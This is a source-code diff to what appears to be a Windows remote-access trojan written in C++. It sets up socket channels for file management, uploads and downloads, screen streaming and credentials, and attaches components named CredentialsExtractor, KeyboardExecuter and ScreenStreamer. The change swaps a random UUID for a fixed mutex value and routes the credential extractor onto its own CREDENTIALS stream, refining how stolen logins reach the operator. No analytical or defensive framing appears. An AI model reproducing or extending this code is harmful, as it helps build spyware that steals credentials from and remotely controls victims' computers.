@@ -27,23 +27,6 @@
 std::map<std::string, std::shared_ptr<Stream>> connections;
 std::mutex connections_mutex;
 
-std::string generate_uuid() {
-    std::random_device dev;
-    std::mt19937 rng(dev());
-    std::uniform_int_distribution<int> dist(0, 15);
-
-    const char *v = "0123456789ABCDEF";
-    std::stringstream ss;
-
-    for (int i = 0; i < 32; ++i) {
-        if (i == 8 || i == 12 || i == 16 || i == 20)
-            ss << "-";
-        ss << v[dist(rng)];
-    }
-
-    return ss.str();
-}
-
 std::vector<std::string> socket_conf_list = {"MAIN",
                                              "FILE_MANAGER",
                                              "DOWNLOAD_UPLOAD",
@@ -68,7 +51,7 @@ std::shared_ptr<Stream> get_connection(const std::string &key) {
 
 
 bool generate_sockets() {
-    std::string uniqueUUID = generate_uuid();
+    std::string uniqueUUID = MUTEX;
     WSADATA WSAData;
     if (WSAStartup(MAKEWORD(2, 0), &WSAData) != 0) {
         std::cerr << "Failed to initialize WinSock" << std::endl;
@@ -145,9 +128,9 @@ int main(int argc = 0, char *argv[] = nullptr) {
             Stream altStream = *get_connection("SCREEN_EVENT");
             ScreenStreamer screenStreamer(stream, altStream);
             stream = *get_connection("CREDENTIALS");
+            CredentialsExtractor credentialsExtractor(stream);
             stream = *get_connection("MAIN");
             MessageBoxGUI messageBoxGUI(stream);
-            CredentialsExtractor credentialsExtractor(stream);
             KeyboardExecuter keyboardExecuter(stream);
             SystemInformation sysInfo(stream);
             NetworkInformation networkInfo(stream);
